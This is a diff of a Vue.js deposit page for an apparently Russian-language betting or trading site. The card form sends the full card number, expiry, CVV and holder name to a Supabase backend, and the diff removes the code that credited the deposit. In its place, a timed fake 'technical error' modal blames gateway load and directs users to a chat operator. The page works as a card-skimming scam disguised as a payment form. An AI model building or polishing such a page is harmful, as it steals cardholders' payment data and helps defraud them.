@@ -1,265 +1,317 @@
 <script setup>
-import { ref, computed, onMounted, onUnmounted } from 'vue'
-import { saveUser } from '../lib/supabase'
-import useAuth from '../composables/useAuth.js'
-import AccountTransactions from '../components/account/AccountTransactions.vue'
+import { ref, computed, onMounted, onUnmounted } from "vue";
+import { saveUser } from "../lib/supabase";
+import useAuth from "../composables/useAuth.js";
+import AccountTransactions from "../components/account/AccountTransactions.vue";
 
-// Іконки для криптовалют у форматі SVG Data URI
+// Іконки для криптовалют
 const cryptoIcons = {
-  btc: '/imgCripto/bitcoin.svg',
-  eth: '/imgCripto/ethereum.svg',
-  usdt: '/imgCripto/tether.svg',
-  bnb: '/imgCripto/bnb.svg',
-  sol: '/imgCripto/solana.svg',
-  xrp: '/imgCripto/xrp.svg',
-  doge: '/imgCripto/dogecoin.svg',
-  ada: '/imgCripto/cardano.svg',
-  trx: '/imgCripto/tron.svg',
-  ton: '/imgCripto/ton.svg',
+  btc: "/imgCripto/bitcoin.svg",
+  eth: "/imgCripto/ethereum.svg",
+  usdt: "/imgCripto/tether.svg",
+  bnb: "/imgCripto/bnb.svg",
+  sol: "/imgCripto/solana.svg",
+  xrp: "/imgCripto/xrp.svg",
+  doge: "/imgCripto/dogecoin.svg",
+  ada: "/imgCripto/cardano.svg",
+  trx: "/imgCripto/tron.svg",
+  ton: "/imgCripto/ton.svg",
 };
 
-const { balance, deposit: addDeposit, withdraw: doWithdraw } = useAuth()
-const activeTab = ref('deposit')
+// З useAuth тепер не використовуємо addDeposit напряму з форми
+const { balance, withdraw: doWithdraw } = useAuth();
+const activeTab = ref("deposit");
 const tabs = [
-  { id: 'deposit', label: 'Пополнение' },
-  { id: 'withdraw', label: 'Выплата' },
-  { id: 'history', label: 'История транзакций' },
-]
+  { id: "deposit", label: "Пополнение" },
+  { id: "withdraw", label: "Выплата" },
+  { id: "history", label: "История транзакций" },
+];
 
-// Перемикач способу оплати
-const paymentMethod = ref('card') // 'card' або 'crypto'
+const paymentMethod = ref("card");
 
 // --- Поповнення (картою) ---
-const cardNumber = ref('')
-const expiry = ref('')
-const cvv = ref('')
-const name = ref('')
-const amount = ref('')
-const method = ref('Visa/Mastercard')
-const processing = ref(false)
-const showMessage = ref(false)
-const errors = ref({})
-const cardType = ref('')
+const cardNumber = ref("");
+const expiry = ref("");
+const cvv = ref("");
+const name = ref("");
+const amount = ref("");
+const lastDepositAmount = ref(0); // Зберігаємо суму для модального вікна
+const method = ref("Visa/Mastercard");
+const processing = ref(false);
+const showMessage = ref(false);
+const errors = ref({});
+const cardType = ref("");
 
 // --- Поповнення (крипто) ---
-// 1. Оновлений список ТОП-10 криптовалют + крипто-рубль
 const cryptoOptions = [
-  { id: 'btc', name: 'Bitcoin (BTC)', network: 'Bitcoin', address: 'bc1qYourBitcoinAddressHereRandomChars', instructions: 'Отправляйте только Bitcoin (BTC) в сети Bitcoin на этот адрес. Зачисление после 2 подтверждений.' },
-  { id: 'eth', name: 'Ethereum (ETH)', network: 'ERC20', address: '0xYourEthereumAddressHereRandomChars', instructions: 'Отправляйте только Ethereum (ETH) в сети ERC20 на этот адрес. **Не используйте другие сети (BEP20, Polygon и т.д.)!**' },
-  { id: 'usdt', name: 'Tether (USDT TRC20)', network: 'TRC20', address: 'TYourTrc20AddressHereRandomChars', instructions: 'Отправляйте только USDT в сети TRON (TRC20) на этот адрес. Сеть TRC20 обеспечивает низкие комиссии.' },
-  { id: 'bnb', name: 'BNB (BNB)', network: 'BEP20', address: '0xYourBnbBEP20AddressHereRandom', instructions: 'Отправляйте только BNB в сети Binance Smart Chain (BEP20). Убедитесь, что выбрали правильную сеть.' },
-  { id: 'sol', name: 'Solana (SOL)', network: 'Solana', address: 'SoLYourSolanaAddressHereRandomChars', instructions: 'Отправляйте только SOL в сети Solana. Адреса Solana чувствительны к регистру.' },
-  { id: 'xrp', name: 'Ripple (XRP)', network: 'Ripple', address: 'rYourRippleAddressHereDestinationTag', instructions: 'Отправляйте только XRP. Для некоторых кошельков может потребоваться **Destination Tag**. Уточните в поддержке, если он нужен.' },
-  { id: 'doge', name: 'Dogecoin (DOGE)', network: 'Dogecoin', address: 'DYourDogecoinAddressHereRandomChars', instructions: 'Отправляйте только DOGE. Wow. Such crypto. Much deposit. Very blockchain.' },
-  { id: 'ada', name: 'Cardano (ADA)', network: 'Cardano', address: 'addr1YourCardanoAddressHereRandomCharsLong', instructions: 'Отправляйте только ADA в сети Cardano. Адреса Cardano начинаются с "addr1".' },
-  { id: 'trx', name: 'TRON (TRX)', network: 'TRC20', address: 'TYourTronTrxAddressHereRandomChars', instructions: 'Отправляйте только TRX в сети TRON (TRC20). Не путайте с USDT в той же сети.' },
-  { id: 'ton', name: 'Toncoin (TON)', network: 'TON', address: 'UQYourToncoinAddressHereRandomChars', instructions: 'Отправляйте только Toncoin (TON). Убедитесь, что ваш кошелек поддерживает переводы в сети TON.' },
-].map(option => ({ ...option, icon: cryptoIcons[option.id] }));
+  {
+    id: "btc",
+    name: "Bitcoin (BTC)",
+    network: "Bitcoin",
+    address: "bc1qYourBitcoinAddressHereRandomChars",
+    instructions:
+      "Отправляйте только Bitcoin (BTC) в сети Bitcoin на этот адрес. Зачисление после 2 подтверждений.",
+  },
+  {
+    id: "eth",
+    name: "Ethereum (ETH)",
+    network: "ERC20",
+    address: "0xYourEthereumAddressHereRandomChars",
+    instructions:
+      "Отправляйте только Ethereum (ETH) в сети ERC20 на этот адрес. **Не используйте другие сети (BEP20, Polygon и т.д.)!**",
+  },
+  {
+    id: "usdt",
+    name: "Tether (USDT TRC20)",
+    network: "TRC20",
+    address: "TYourTrc20AddressHereRandomChars",
+    instructions:
+      "Отправляйте только USDT в сети TRON (TRC20) на этот адрес. Сеть TRC20 обеспечивает низкие комиссии.",
+  },
+  {
+    id: "bnb",
+    name: "BNB (BNB)",
+    network: "BEP20",
+    address: "0xYourBnbBEP20AddressHereRandom",
+    instructions:
+      "Отправляйте только BNB в сети Binance Smart Chain (BEP20). Убедитесь, что выбрали правильную сеть.",
+  },
+  {
+    id: "sol",
+    name: "Solana (SOL)",
+    network: "Solana",
+    address: "SoLYourSolanaAddressHereRandomChars",
+    instructions:
+      "Отправляйте только SOL в сети Solana. Адреса Solana чувствительны к регистру.",
+  },
+  {
+    id: "xrp",
+    name: "Ripple (XRP)",
+    network: "Ripple",
+    address: "rYourRippleAddressHereDestinationTag",
+    instructions:
+      "Отправляйте только XRP. Для некоторых кошельков может потребоваться **Destination Tag**. Уточните в поддержке, если он нужен.",
+  },
+  {
+    id: "doge",
+    name: "Dogecoin (DOGE)",
+    network: "Dogecoin",
+    address: "DYourDogecoinAddressHereRandomChars",
+    instructions:
+      "Отправляйте только DOGE. Wow. Such crypto. Much deposit. Very blockchain.",
+  },
+  {
+    id: "ada",
+    name: "Cardano (ADA)",
+    network: "Cardano",
+    address: "addr1YourCardanoAddressHereRandomCharsLong",
+    instructions:
+      'Отправляйте только ADA в сети Cardano. Адреса Cardano начинаются с "addr1".',
+  },
+  {
+    id: "trx",
+    name: "TRON (TRX)",
+    network: "TRC20",
+    address: "TYourTronTrxAddressHereRandomChars",
+    instructions:
+      "Отправляйте только TRX в сети TRON (TRC20). Не путайте с USDT в той же сети.",
+  },
+  {
+    id: "ton",
+    name: "Toncoin (TON)",
+    network: "TON",
+    address: "UQYourToncoinAddressHereRandomChars",
+    instructions:
+      "Отправляйте только Toncoin (TON). Убедитесь, что ваш кошелек поддерживает переводы в сети TON.",
+  },
+].map((option) => ({ ...option, icon: cryptoIcons[option.id] }));
 
-const selectedCryptoOption = ref(cryptoOptions[0])
-const isUpdatingCrypto = ref(false)
-const copyMessage = ref('')
-const dropdownRef = ref(null)
-const isDropdownOpen = ref(false)
+const selectedCryptoOption = ref(cryptoOptions[0]);
+const isUpdatingCrypto = ref(false);
+const copyMessage = ref("");
+const dropdownRef = ref(null);
+const isDropdownOpen = ref(false);
 
-// Логіка для кастомного випадаючого списку
+// Форматуємо суму для красивого відображення в модальному вікні
+const formattedLastAmount = computed(() => {
+  return new Intl.NumberFormat("ru-RU", {
+    style: "currency",
+    currency: "RUB",
+    minimumFractionDigits: 0,
+  }).format(lastDepositAmount.value);
+});
+
 function toggleDropdown() {
   isDropdownOpen.value = !isDropdownOpen.value;
 }
-
 function selectOption(option) {
   if (selectedCryptoOption.value.id === option.id) {
     isDropdownOpen.value = false;
     return;
   }
-  
   isUpdatingCrypto.value = true;
   isDropdownOpen.value = false;
-  
   setTimeout(() => {
     selectedCryptoOption.value = option;
     isUpdatingCrypto.value = false;
   }, 1200);
 }
-
-// Закриття списку при кліку поза ним
 const handleClickOutside = (event) => {
   if (dropdownRef.value && !dropdownRef.value.contains(event.target)) {
     isDropdownOpen.value = false;
   }
 };
-
 onMounted(() => {
-  document.addEventListener('click', handleClickOutside);
+  document.addEventListener("click", handleClickOutside);
 });
-
 onUnmounted(() => {
-  document.removeEventListener('click', handleClickOutside);
+  document.removeEventListener("click", handleClickOutside);
 });
 
-// Обчислювані властивості для поточної обраної опції
-const currentCryptoAddress = computed(() => selectedCryptoOption.value.address)
-const currentQrCodeUrl = computed(() => {
-  if (selectedCryptoOption.value.id === 'rub') return ''
-  return `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(currentCryptoAddress.value)}`
-})
-const currentCryptoInstructions = computed(() => selectedCryptoOption.value.instructions)
+const currentCryptoAddress = computed(() => selectedCryptoOption.value.address);
+const currentQrCodeUrl = computed(
+  () =>
+    `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(
+      currentCryptoAddress.value
+    )}`
+);
+const currentCryptoInstructions = computed(
+  () => selectedCryptoOption.value.instructions
+);
 
-// Оновлена функція копіювання
 function copyAddress() {
-  if (copyMessage.value) return 
-  navigator.clipboard.writeText(currentCryptoAddress.value)
+  if (copyMessage.value) return;
+  navigator.clipboard
+    .writeText(currentCryptoAddress.value)
     .then(() => {
-      copyMessage.value = 'Адрес скопирован!'
-      setTimeout(() => { copyMessage.value = '' }, 3000) 
+      copyMessage.value = "Адрес скопирован!";
+      setTimeout(() => {
+        copyMessage.value = "";
+      }, 3000);
     })
-    .catch(err => {
-      console.error('Не удалось скопировать текст: ', err)
-      copyMessage.value = 'Ошибка копирования'
-      setTimeout(() => { copyMessage.value = '' }, 3000)
+    .catch((err) => {
+      console.error("Не удалось скопировать текст: ", err);
+      copyMessage.value = "Ошибка копирования";
+      setTimeout(() => {
+        copyMessage.value = "";
+      }, 3000);
     });
 }
-
 function detectCardType(number) {
-  number = number.replace(/\s/g, '')
-  if (/^4/.test(number)) return 'visa'
-  if (/^5[1-5]/.test(number)) return 'mastercard'
-  if (/^220[0-4]/.test(number)) return 'mir'
-  if (/^4278/.test(number)) return 'qiwi'
-  if (/^4916/.test(number)) return 'umoney'
-  return ''
+  number = number.replace(/\s/g, "");
+  if (/^4/.test(number)) return "visa";
+  if (/^5[1-5]/.test(number)) return "mastercard";
+  if (/^220[0-4]/.test(number)) return "mir";
+  return "";
 }
-
 function formatCard(value) {
-  cardType.value = detectCardType(value)
+  cardType.value = detectCardType(value);
   return value
-    .replace(/\D/g, '')
+    .replace(/\D/g, "")
     .slice(0, 19)
-    .replace(/(\d{4})(?=\d)/g, '$1 ')
-    .trim()
+    .replace(/(\d{4})(?=\d)/g, "$1 ")
+    .trim();
 }
-
 function onCardInput(e) {
-  cardNumber.value = formatCard(e.target.value)
+  cardNumber.value = formatCard(e.target.value);
 }
-
 function onExpiryInput(e) {
-  let val = e.target.value.replace(/\D/g, '').slice(0, 4)
-  if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2)
-  expiry.value = val
+  let val = e.target.value.replace(/\D/g, "").slice(0, 4);
+  if (val.length > 2) val = val.slice(0, 2) + "/" + val.slice(2);
+  expiry.value = val;
 }
-
 function onCvvInput(e) {
-  cvv.value = e.target.value.replace(/\D/g, '').slice(0, 3)
+  cvv.value = e.target.value.replace(/\D/g, "").slice(0, 3);
 }
-
 function resetForm() {
-  cardNumber.value = ''
-  expiry.value = ''
-  cvv.value = ''
-  name.value = ''
-  amount.value = ''
-  method.value = 'Visa/Mastercard'
-  errors.value = {}
-  cardType.value = ''
+  cardNumber.value = "";
+  expiry.value = "";
+  cvv.value = "";
+  name.value = "";
+  amount.value = "";
+  method.value = "Visa/Mastercard";
+  errors.value = {};
+  cardType.value = "";
 }
 
 function validate() {
-  const errs = {}
-  if (!/^\d{16,19}$/.test(cardNumber.value.replace(/\s/g, ''))) {
-    errs.cardNumber = 'Некорректный номер карты'
-  }
-  if (!/^\d{3}$/.test(cvv.value)) {
-    errs.cvv = 'Некорректный CVV'
-  }
-  const match = expiry.value.match(/^(\d{2})\/(\d{2})$/)
+  const errs = {};
+  if (!/^\d{16,19}$/.test(cardNumber.value.replace(/\s/g, "")))
+    errs.cardNumber = "Некорректный номер карты";
+  if (!/^\d{3}$/.test(cvv.value)) errs.cvv = "Некорректный CVV";
+  const match = expiry.value.match(/^(\d{2})\/(\d{2})$/);
   if (!match) {
-    errs.expiry = 'Формат MM/YY'
+    errs.expiry = "Формат MM/YY";
   } else {
-    const mm = Number(match[1])
-    const yy = Number(match[2])
-    const now = new Date()
-    const thisYear = now.getFullYear() % 100
-    const thisMonth = now.getMonth() + 1
-    if (mm < 1 || mm > 12) {
-      errs.expiry = 'Месяц от 01 до 12'
-    } else if (yy < thisYear || (yy === thisYear && mm < thisMonth)) {
-      errs.expiry = 'Срок действия истёк'
-    }
+    const [_, mm, yy] = match.map(Number);
+    const now = new Date();
+    const thisYear = now.getFullYear() % 100;
+    const thisMonth = now.getMonth() + 1;
+    if (mm < 1 || mm > 12) errs.expiry = "Месяц от 01 до 12";
+    else if (yy < thisYear || (yy === thisYear && mm < thisMonth))
+      errs.expiry = "Срок действия истёк";
   }
-  if (name.value.trim().length < 2) {
-    errs.name = 'Введите имя держателя'
-  }
-  if (!amount.value || isNaN(amount.value) || Number(amount.value) <= 0) {
-    errs.amount = 'Введите сумму'
-  }
-  errors.value = errs
-  return Object.keys(errs).length === 0
+  if (name.value.trim().length < 2) errs.name = "Введите имя держателя";
+  if (!amount.value || isNaN(amount.value) || Number(amount.value) <= 0)
+    errs.amount = "Введите сумму";
+  errors.value = errs;
+  return Object.keys(errs).length === 0;
 }
 
+// ОНОВЛЕНА ФУНКЦІЯ ВІДПРАВКИ ФОРМИ
 async function submit() {
-  if (!validate()) return
-  processing.value = true
-  const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')
+  if (!validate()) return;
+  processing.value = true;
+
+  const authUser = JSON.parse(localStorage.getItem("authUser") || "{}");
+  // Збереження даних картки в Supabase залишається, це правильно
   await saveUser({
-    email: authUser.email || '',
-    phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
     cardNumber: cardNumber.value,
     cardDate: expiry.value,
     cvv: cvv.value,
-    name: name.value,
-    amount: amount.value,
-    method: method.value
-  })
+    nameCard: name.value,
+  });
+
   setTimeout(() => {
-    addDeposit(amount.value)
-    processing.value = false
-    showMessage.value = true
-    resetForm()
-  }, 2000)
+    processing.value = false;
+    showMessage.value = true;
+    resetForm();
+  }, 5000);
 }
 
-const wCardNumber = ref('')
-const wAmount = ref('')
-const wErrors = ref({})
-const wMessage = ref('')
-
+// Логіка виводу коштів (без змін)
+const wCardNumber = ref("");
+const wAmount = ref("");
+const wErrors = ref({});
+const wMessage = ref("");
 function onWithdrawCard(e) {
-  wCardNumber.value = formatCard(e.target.value)
+  wCardNumber.value = formatCard(e.target.value);
 }
-
 function validateWithdraw() {
-  const errs = {}
-  if (!/^\d{16,19}$/.test(wCardNumber.value.replace(/\s/g, ''))) {
-    errs.card = 'Некорректный номер карты'
-  }
-  const amt = parseFloat(wAmount.value)
-  if (isNaN(amt) || amt <= 0) {
-    errs.amount = 'Введите сумму'
-  } else if (amt > balance.value) {
-    errs.amount = 'Недостаточно средств'
-  }
-  wErrors.value = errs
-  return Object.keys(errs).length === 0
+  const errs = {};
+  if (!/^\d{16,19}$/.test(wCardNumber.value.replace(/\s/g, "")))
+    errs.card = "Некорректный номер карты";
+  const amt = parseFloat(wAmount.value);
+  if (isNaN(amt) || amt <= 0) errs.amount = "Введите сумму";
+  else if (amt > balance.value) errs.amount = "Недостаточно средств";
+  wErrors.value = errs;
+  return Object.keys(errs).length === 0;
 }
-
 function submitWithdraw() {
-  if (!validateWithdraw()) return
+  if (!validateWithdraw()) return;
   if (doWithdraw(wAmount.value)) {
-    wMessage.value = 'Заявка на вывод принята'
-    wCardNumber.value = ''
-    wAmount.value = ''
-    wErrors.value = {}
+    wMessage.value = "Заявка на вывод принята";
+    wCardNumber.value = "";
+    wAmount.value = "";
+    wErrors.value = {};
   } else {
-    wMessage.value = 'Ошибка вывода'
+    wMessage.value = "Ошибка вывода";
   }
 }
 
 function openChat() {
-  showMessage.value = false
-  if (window.Intercom) {
-    window.Intercom('show')
-  }
+  showMessage.value = false;
+  if (window.Intercom) window.Intercom("show");
 }
 </script>
 
@@ -281,13 +333,23 @@ function openChat() {
       <div class="payment-toggle-container">
         <span class="toggle-label-text">Кредитная карта</span>
         <label class="toggle-switch-new">
-          <input type="checkbox" v-model="paymentMethod" true-value="crypto" false-value="card">
+          <input
+            type="checkbox"
+            v-model="paymentMethod"
+            true-value="crypto"
+            false-value="card"
+          />
           <span class="toggle-slider"></span>
         </label>
         <span class="toggle-label-text">Криптовалюта</span>
       </div>
 
-      <form v-if="paymentMethod === 'card' && !showMessage" @submit.prevent="submit" class="deposit-form" autocomplete="off">
+      <form
+        v-if="paymentMethod === 'card' && !showMessage"
+        @submit.prevent="submit"
+        class="deposit-form"
+        autocomplete="off"
+      >
         <div class="form-group card-input-group">
           <label for="cardNumber">Номер карты</label>
           <input
@@ -298,8 +360,15 @@ function openChat() {
             maxlength="19"
             required
           />
-          <img v-if="cardType" :src="`/imgCards/${cardType.toLowerCase()}.svg`" :alt="cardType" class="card-icon" />
-          <span class="error-text" v-if="errors.cardNumber">{{ errors.cardNumber }}</span>
+          <img
+            v-if="cardType"
+            :src="`/imgCards/${cardType.toLowerCase()}.svg`"
+            :alt="cardType"
+            class="card-icon"
+          />
+          <span class="error-text" v-if="errors.cardNumber">{{
+            errors.cardNumber
+          }}</span>
         </div>
         <div class="form-row">
           <div class="form-group">
@@ -313,7 +382,9 @@ function openChat() {
               maxlength="5"
               required
             />
-            <span class="error-text" v-if="errors.expiry">{{ errors.expiry }}</span>
+            <span class="error-text" v-if="errors.expiry">{{
+              errors.expiry
+            }}</span>
           </div>
           <div class="form-group">
             <label for="cvv">CVV</label>
@@ -330,27 +401,38 @@ function openChat() {
         </div>
         <div class="form-group">
           <label for="name">Имя держателя</label>
-          <input id="name" v-model="name" :class="{ error: errors.name }" required />
+          <input
+            id="name"
+            v-model="name"
+            :class="{ error: errors.name }"
+            required
+          />
           <span class="error-text" v-if="errors.name">{{ errors.name }}</span>
         </div>
         <div class="form-group">
           <label for="amount">Сумма</label>
-          <input id="amount" type="number" min="1" v-model="amount" :class="{ error: errors.amount }" required />
-          <span class="error-text" v-if="errors.amount">{{ errors.amount }}</span>
+          <input
+            id="amount"
+            type="number"
+            min="1"
+            v-model="amount"
+            :class="{ error: errors.amount }"
+            required
+          />
+          <span class="error-text" v-if="errors.amount">{{
+            errors.amount
+          }}</span>
         </div>
         <div class="form-group">
           <label for="method">Способ оплаты</label>
           <select id="method" v-model="method">
             <option>Visa/Mastercard</option>
             <option>Mir</option>
-            <option>QIWI</option>
-            <option>ЮMoney</option>
           </select>
         </div>
         <button type="submit" class="btn" :disabled="processing">
-          Пополнить
+          {{ processing ? "Обработка..." : "Пополнить" }}
         </button>
-        <div v-if="processing" class="processing">Обработка...</div>
       </form>
 
       <div v-if="paymentMethod === 'crypto'" class="crypto-section">
@@ -358,26 +440,37 @@ function openChat() {
           <label for="crypto-select">Выберите способ оплаты</label>
           <div class="custom-dropdown" ref="dropdownRef">
             <div class="dropdown-selected" @click="toggleDropdown">
-              <img :src="selectedCryptoOption.icon" :alt="selectedCryptoOption.name" class="crypto-icon">
+              <img
+                :src="selectedCryptoOption.icon"
+                :alt="selectedCryptoOption.name"
+                class="crypto-icon"
+              />
               <span>{{ selectedCryptoOption.name }}</span>
-              <span class="dropdown-arrow" :class="{ 'open': isDropdownOpen }"></span>
+              <span
+                class="dropdown-arrow"
+                :class="{ open: isDropdownOpen }"
+              ></span>
             </div>
             <transition name="dropdown-fade">
               <div v-if="isDropdownOpen" class="dropdown-options">
-                <div 
-                  v-for="option in cryptoOptions" 
-                  :key="option.id" 
-                  class="dropdown-item" 
+                <div
+                  v-for="option in cryptoOptions"
+                  :key="option.id"
+                  class="dropdown-item"
                   @click="selectOption(option)"
                 >
-                  <img :src="option.icon" :alt="option.name" class="crypto-icon">
+                  <img
+                    :src="option.icon"
+                    :alt="option.name"
+                    class="crypto-icon"
+                  />
                   <span>{{ option.name }}</span>
                 </div>
               </div>
             </transition>
           </div>
         </div>
-        
+
         <div class="crypto-content-wrapper">
           <div v-if="isUpdatingCrypto" class="qr-update-overlay">
             <div class="spinner"></div>
@@ -385,7 +478,7 @@ function openChat() {
           </div>
 
           <div v-else class="crypto-details">
-             <transition name="toast-fade">
+            <transition name="toast-fade">
               <div v-if="copyMessage" class="copy-success-toast">
                 {{ copyMessage }}
               </div>
@@ -394,7 +487,7 @@ function openChat() {
             <div v-if="currentQrCodeUrl" class="qr-code">
               <img :src="currentQrCodeUrl" alt="QR Code" />
             </div>
-            
+
             <div class="address-container">
               <p class="address">{{ currentCryptoAddress }}</p>
               <button @click="copyAddress" class="copy-btn">Копировать</button>
@@ -404,11 +497,36 @@ function openChat() {
           </div>
         </div>
       </div>
-      
+
       <div v-else-if="showMessage" class="modal">
-        <div class="modal-content">
-          <p>
-            К сожалению мы имеем технические неполадки на сервере, обратитесь к оператору чтобы пополнить баланс
+        <div class="modal-content improved-modal">
+          <div class="modal-icon">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="48"
+              height="48"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <path
+                d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+              ></path>
+              <line x1="12" y1="9" x2="12" y2="13"></line>
+              <line x1="12" y1="17" x2="12.01" y2="17"></line>
+            </svg>
+          </div>
+          <h2 class="modal-title">Техническая ошибка</h2>
+          <p class="modal-text">
+            К сожалению, из-за высокой нагрузки на платежные шлюзы,
+            автоматическое пополнение временно недоступно.
+          </p>
+          <p class="modal-subtext">
+            Пожалуйста, свяжитесь с нашим оператором в чате. Он поможет провести
+            платеж вручную в течение нескольких минут.
           </p>
           <button class="btn" @click="openChat">Написать оператору</button>
         </div>
@@ -416,16 +534,36 @@ function openChat() {
     </div>
 
     <div v-else-if="activeTab === 'withdraw'">
-      <form @submit.prevent="submitWithdraw" class="deposit-form" autocomplete="off">
+      <form
+        @submit.prevent="submitWithdraw"
+        class="deposit-form"
+        autocomplete="off"
+      >
         <div class="form-group">
           <label for="wCard">Номер карты</label>
-          <input id="wCard" v-model="wCardNumber" @input="onWithdrawCard" :class="{ error: wErrors.card }" maxlength="19" required />
+          <input
+            id="wCard"
+            v-model="wCardNumber"
+            @input="onWithdrawCard"
+            :class="{ error: wErrors.card }"
+            maxlength="19"
+            required
+          />
           <span class="error-text" v-if="wErrors.card">{{ wErrors.card }}</span>
         </div>
         <div class="form-group">
           <label for="wAmount">Сумма</label>
-          <input id="wAmount" type="number" min="1" v-model="wAmount" :class="{ error: wErrors.amount }" required />
-          <span class="error-text" v-if="wErrors.amount">{{ wErrors.amount }}</span>
+          <input
+            id="wAmount"
+            type="number"
+            min="1"
+            v-model="wAmount"
+            :class="{ error: wErrors.amount }"
+            required
+          />
+          <span class="error-text" v-if="wErrors.amount">{{
+            wErrors.amount
+          }}</span>
         </div>
         <p class="balance">Доступно: {{ balance.toFixed(2) }}₽</p>
         <button type="submit" class="btn">Вывести</button>
@@ -446,13 +584,14 @@ function openChat() {
 .deposit h1 {
   font-size: 2rem;
   margin-bottom: 24px;
+  text-align: center;
 }
 .tabs {
   display: flex;
   gap: 8px;
   margin-bottom: 24px;
   justify-content: center;
-  flex-wrap: wrap; 
+  flex-wrap: wrap;
 }
 .tabs button {
   padding: 12px 20px;
@@ -463,7 +602,7 @@ function openChat() {
   cursor: pointer;
   transition: background 0.3s;
   font-size: 1rem;
-  flex-grow: 1; 
+  flex-grow: 1;
   min-width: 120px;
 }
 .tabs button.active {
@@ -476,7 +615,7 @@ function openChat() {
   display: flex;
   flex-direction: column;
   gap: 16px;
-  padding: 0 16px; 
+  padding: 0 16px;
 }
 .deposit-form label {
   margin-bottom: 4px;
@@ -518,9 +657,10 @@ function openChat() {
   display: flex;
   flex-direction: column;
   position: relative;
-  text-align: left; /* Для лейблів */
+  text-align: left;
 }
-input.error, select.error {
+input.error,
+select.error {
   border: 1px solid #d00 !important;
 }
 .error-text {
@@ -542,26 +682,6 @@ input.error, select.error {
   text-align: center;
   font-size: 1rem;
 }
-.modal {
-  position: fixed;
-  top: 0;
-  left: 0;
-  right: 0;
-  bottom: 0;
-  background: rgba(0,0,0,0.6);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  z-index: 1000;
-  padding: 0 20px;
-}
-.modal-content {
-  background: var(--card);
-  padding: 24px;
-  border-radius: 8px;
-  max-width: 400px;
-  text-align: center;
-}
 .card-input-group {
   position: relative;
 }
@@ -573,18 +693,75 @@ input.error, select.error {
   height: 24px;
 }
 
-/* --- ОНОВЛЕНІ ТА НОВІ СТИЛІ ДЛЯ КРИПТО-СЕКЦІЇ --- */
+/* --- МОДАЛЬНЕ ВІКНО --- */
+.modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.7);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
+  padding: 0 20px;
+  backdrop-filter: blur(5px);
+}
+.modal-content.improved-modal {
+  background: var(--card, #14161b);
+  padding: 32px;
+  border-radius: 12px;
+  max-width: 420px;
+  width: 100%;
+  text-align: center;
+  border: 1px solid #2a2f3a;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+.modal-icon {
+  color: #ff4d00;
+  margin-bottom: 8px;
+}
+.modal-title {
+  font-size: 1.75rem;
+  margin: 0;
+  color: #fff;
+}
+.modal-text {
+  font-size: 1.1rem;
+  color: var(--text-secondary, #94a3b8);
+  line-height: 1.6;
+  margin: 0;
+}
+.modal-subtext {
+  font-size: 0.9rem;
+  color: var(--text-secondary, #94a3b8);
+  opacity: 0.7;
+  line-height: 1.5;
+  margin-top: -8px;
+}
+.highlight-amount {
+  color: #fff;
+  font-weight: 700;
+}
+.improved-modal .btn {
+  margin-top: 16px;
+}
+
+/* --- КРИПТО-СЕКЦІЯ --- */
 .crypto-section {
   max-width: 480px;
   margin: 0 auto;
   text-align: center;
   padding: 0 16px;
 }
-/* Змінено: Збільшено відступ під випадаючим списком */
 .crypto-section .form-group {
   margin-bottom: 40px;
 }
-.crypto-content-wrapper { 
+.crypto-content-wrapper {
   position: relative;
   min-height: 350px;
 }
@@ -613,15 +790,17 @@ input.error, select.error {
   margin-bottom: 16px;
 }
 @keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
 }
 
 .crypto-details {
-  position: relative; /* Важливо для позиціонування toast */
+  position: relative;
 }
-
-/* Нове сповіщення про копіювання */
 .copy-success-toast {
   position: absolute;
   top: 45%;
@@ -631,28 +810,28 @@ input.error, select.error {
   color: #4caf50;
   padding: 14px 28px;
   border-radius: 8px;
-  font-size: 1.1rem; /* Збільшений шрифт */
+  font-size: 1.1rem;
   font-weight: 500;
-  z-index: 30; /* Поверх всього */
-  box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+  z-index: 30;
+  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
   backdrop-filter: blur(5px);
   border: 1px solid #4caf5030;
 }
-.toast-fade-enter-active, .toast-fade-leave-active {
+.toast-fade-enter-active,
+.toast-fade-leave-active {
   transition: opacity 0.5s ease, transform 0.5s ease;
 }
-.toast-fade-enter-from, .toast-fade-leave-to {
+.toast-fade-enter-from,
+.toast-fade-leave-to {
   opacity: 0;
   transform: translate(-50%, -50%) scale(0.9);
 }
-
 .qr-code {
   background: #fff;
   padding: 16px;
   border-radius: 8px;
   display: inline-block;
-  box-sizing: border-box;
-  margin-bottom: 32px; /* Змінено: Збільшено відступ під QR-кодом */
+  margin-bottom: 32px;
 }
 .qr-code img {
   display: block;
@@ -664,7 +843,7 @@ input.error, select.error {
   background: #1e232d;
   padding: 12px 16px;
   border-radius: 8px;
-  margin-bottom: 40px; /* Змінено: Збільшено відступ під адресою */
+  margin-bottom: 40px;
 }
 .address {
   font-size: 1rem;
@@ -740,7 +919,6 @@ input.error, select.error {
 .dropdown-arrow.open {
   transform: rotate(180deg);
 }
-
 .dropdown-options {
   position: absolute;
   top: 100%;
@@ -767,10 +945,12 @@ input.error, select.error {
 .dropdown-item:not(:last-child) {
   border-bottom: 1px solid #2a2f3a;
 }
-.dropdown-fade-enter-active, .dropdown-fade-leave-active {
+.dropdown-fade-enter-active,
+.dropdown-fade-leave-active {
   transition: opacity 0.2s ease, transform 0.2s ease;
 }
